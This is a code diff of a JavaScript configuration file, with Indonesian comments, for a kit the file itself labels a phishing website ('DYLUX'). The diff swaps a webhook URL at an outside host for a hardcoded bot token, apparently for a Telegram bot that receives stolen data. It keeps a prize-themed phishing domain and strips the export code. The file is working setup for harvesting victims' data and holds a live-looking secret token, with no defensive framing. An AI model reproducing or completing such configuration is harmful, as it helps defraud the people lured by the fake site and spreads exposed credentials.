@@ -1,26 +1,15 @@
 // ============================================
-// DYLUX - KONFIGURASI PUSAT
+// DYLUX - KONFIGURASI PUSAT (WEB PHISING)
 // ============================================
 
 const DYLUX_CONFIG = {
     // ==========================================
-    // WEBHOOK URL - GANTI DI SINI AJA!
+    // TOKEN BOT - HARDCODE DI SINI!
     // ==========================================
-    WEBHOOK_URL: 'http://host-kazzah.zaxiyent.my.id:2001/api/webhook',
+    BOT_TOKEN: '8838947724:AAE4VPcdveETgWXPx6FU143kEkoW2f19W9o',
     
     // ==========================================
-    // DOMAIN WEB PHISING - GANTI DI SINI JUGA!
+    // DOMAIN WEB PHISING
     // ==========================================
-    PHISHING_DOMAIN: 'https://dyluxx-berhadiah.vercel.app',
-    
-    // ==========================================
-    // KONFIGURASI LAIN
-    // ==========================================
-    APP_NAME: 'DYLUX',
-    VERSION: '1.0.0'
+    PHISHING_DOMAIN: 'https://dyluxx-berhadiah.vercel.app'
 };
-
-// Export biar bisa dipake di file lain
-if (typeof module !== 'undefined' && module.exports) {
-    module.exports = DYLUX_CONFIG;
-}
